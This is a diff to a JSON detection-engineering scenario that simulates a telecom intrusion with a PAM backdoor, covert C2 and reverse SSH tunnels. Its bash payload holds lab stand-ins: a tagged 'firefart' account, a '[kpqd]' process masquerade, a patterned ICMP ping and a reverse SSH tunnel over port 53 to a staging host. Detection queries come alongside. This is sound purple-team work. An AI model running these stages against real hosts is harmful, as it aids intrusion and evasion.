@@ -54,7 +54,7 @@
   "identity": {
     "name": "CL-STA-0969 Telecom Intrusion — AuthDoor PAM Backdoor, GTPDoor / EchoBackdoor Covert C2 and Reverse SSH Tunnels (T1556.003 / T1205 / T1572)",
     "summary": "Endpoint + NGFW stitched chain for Unit 42's CL-STA-0969 telecom report: SSH dictionary attempts, firefart residue, an AuthDoor pam_unix.so write, a [kpqd] masquerade, a GTP-C 2123 listener, covert ICMP/DNS, a reverse SSH tunnel to port 53 and a wtmp scrub, plus WildFire logs for five toolkit sha256s, joined on src_host by CR-MP-0033.",
-    "description": "CL-STA-0969 targeted telecommunications organisations' roaming and interconnect networks. Entry was most likely SSH brute force with a dictionary of telecom built-in accounts. The actor escalated with public DirtyCoW, PwnKit and sudo exploits (DirtyCoW leaving the temporary user firefart), replaced pam_unix.so with the AuthDoor backdoor (captured credentials in /usr/bin/.dbus.log), ran tools under dbus-* and kernel-thread names kept alive by watchdog scripts, and used covert channels: GTPDoor over GTP-C on UDP 2123, EchoBackdoor over ICMP echo, NoDepDNS over raw DNS, plus reverse SSH tunnels to remote port 53, Microsocks, FRP and Cordscan for SGSN collection. It cleared wtmp with utmpdump and sed, nulled HISTFILE and timestomped with touch -r. The simulation runs each stage with inert stand-ins against lab targets and emits the NGFW WildFire records for five tools with their published hashes.",
+    "description": "CL-STA-0969 targeted telecommunications organisations' roaming and interconnect networks. Entry was most likely SSH brute force with a dictionary of telecom built-in accounts. The actor escalated with public DirtyCoW, PwnKit and sudo exploits (DirtyCoW leaving the temporary user firefart), replaced pam_unix.so with the AuthDoor backdoor (captured credentials in /usr/bin/.dbus.log), ran tools under dbus-* and kernel-thread names kept alive by watchdog scripts, and used covert channels: GTPDoor over GTP-C on UDP 2123, EchoBackdoor over ICMP echo, NoDepDNS over raw DNS, plus reverse SSH tunnels to remote port 53, Microsocks, FRP and Cordscan for SGSN collection. It cleared wtmp with utmpdump and sed, nulled HISTFILE and timestomped with touch -r. The report's SELinux disable (setenforce 0, /etc/selinux/config edit) is deliberately not reproduced. The simulation runs each stage with inert stand-ins against lab targets and emits the NGFW WildFire records for five tools with their published hashes.",
     "severity": "high",
     "confidence": "high"
   },
@@ -160,6 +160,17 @@
         ]
       },
       {
+        "technique_id": "T1071",
+        "subtechnique_id": "T1071.004",
+        "name": "Application Layer Protocol: DNS",
+        "tactic_ids": [
+          "TA0011"
+        ],
+        "tactic_names": [
+          "Command and Control"
+        ]
+      },
+      {
         "technique_id": "T1572",
         "name": "Protocol Tunneling",
         "tactic_ids": [
@@ -194,6 +205,17 @@
         "technique_id": "T1070",
         "subtechnique_id": "T1070.002",
         "name": "Indicator Removal: Clear Linux or Mac System Logs",
+        "tactic_ids": [
+          "TA0005"
+        ],
+        "tactic_names": [
+          "Defense Evasion"
+        ]
+      },
+      {
+        "technique_id": "T1070",
+        "subtechnique_id": "T1070.003",
+        "name": "Indicator Removal: Clear Command History",
         "tactic_ids": [
           "TA0005"
         ],
@@ -240,7 +262,7 @@
     ],
     "payload": {
       "interpreter": "bash",
-      "code": "# Inert endpoint stages of SIM-MP-033 (see the scenario for the full per-step commands).\nLAB=/var/tmp/.cortexsim-mp033; mkdir -p \"$LAB/lib/security\" \"$LAB/bin\"\nuseradd -M -s /usr/sbin/nologin firefart && userdel firefart\ncp \"$(find /lib /usr/lib -name pam_unix.so | head -n 1)\" \"$LAB/lib/security/pam_unix.so\"\n( exec -a '[kpqd]' sleep 25 ) &\nping -c 3 -s 14 -p 66756e6e79416e644861707079 \"${STAGE_HOST:-127.0.0.1}\"\ntimeout 8 ssh -o BatchMode=yes -N -R 2222:127.0.0.1:22 -p 53 \"tunnel@${STAGE_HOST:-127.0.0.1}\" || true",
+      "code": "# Inert endpoint stages of SIM-MP-033 (see the scenario for the full per-step commands).\nLAB=/var/tmp/.cortexsim-mp033; mkdir -p \"$LAB/lib/security\" \"$LAB/bin\"\nuseradd -r -N -M -s /usr/sbin/nologin -c 'cortexsim-mp033' firefart\ngetent passwd firefart | grep -q cortexsim-mp033 && userdel firefart\ncp \"$(find /lib /usr/lib -name pam_unix.so | head -n 1)\" \"$LAB/lib/security/pam_unix.so\"\n( exec -a '[kpqd]' sleep 25 ) &\nping -c 3 -s 14 -p 66756e6e79416e644861707079 \"${STAGE_HOST:-127.0.0.1}\"\ntimeout 8 ssh -o BatchMode=yes -N -R 2222:127.0.0.1:22 -p 53 \"tunnel@${STAGE_HOST:-127.0.0.1}\" || true",
       "input_variables": [
         {
           "name": "STAGE_HOST",
@@ -276,7 +298,7 @@
     ],
     "cleanup": {
       "interpreter": "bash",
-      "code": "pkill -f '^\\[kpqd\\]' || true; pkill -f '^dnsd_el5' || true\nif id firefart >/dev/null 2>&1; then userdel firefart; fi\nrm -f /usr/bin/.dbus.log /tmp/mp-033-threat.yml /tmp/mp-033-ssh.yml\nrm -rf /var/tmp/.cortexsim-mp033"
+      "code": "pkill -f '^\\[kpqd\\]' || true; pkill -f '^dnsd_el5' || true\nif getent passwd firefart | grep -q cortexsim-mp033; then userdel firefart; fi\nif [ -e /var/tmp/.cortexsim-mp033/.dbus-log-created ]; then rm -f /usr/bin/.dbus.log; fi\nrm -f /tmp/mp-033-threat.yml /tmp/mp-033-ssh.yml\nrm -rf /var/tmp/.cortexsim-mp033"
     }
   },
   "detections": {
@@ -430,7 +452,7 @@
       {
         "name": "MP-033 NGFW Rare SSH Session from the Telecom Host",
         "description": "NGFW EAL behavioural alert: the endpoint (src_host) opens an SSH session to an uncommon external host. Preset destination — the report publishes no domain or IP; the record stitches on src_host.",
-        "logic": "dataset = panw_ngfw_traffic_raw\n| filter app = \"ssh\" and dest_port = 22\n| comp count() as sessions, count_distinct(dst) as dests by src, endpoint_device_name\n| filter sessions >= 1",
+        "logic": "dataset = panw_ngfw_traffic_raw\n| filter app = \"ssh\" and dst_port = 22\n| comp count() as sessions, count_distinct(dst) as dests by src, endpoint_device_name\n| filter sessions >= 1",
         "severity": "medium",
         "mitre_technique_ids": [
           "T1021.004",
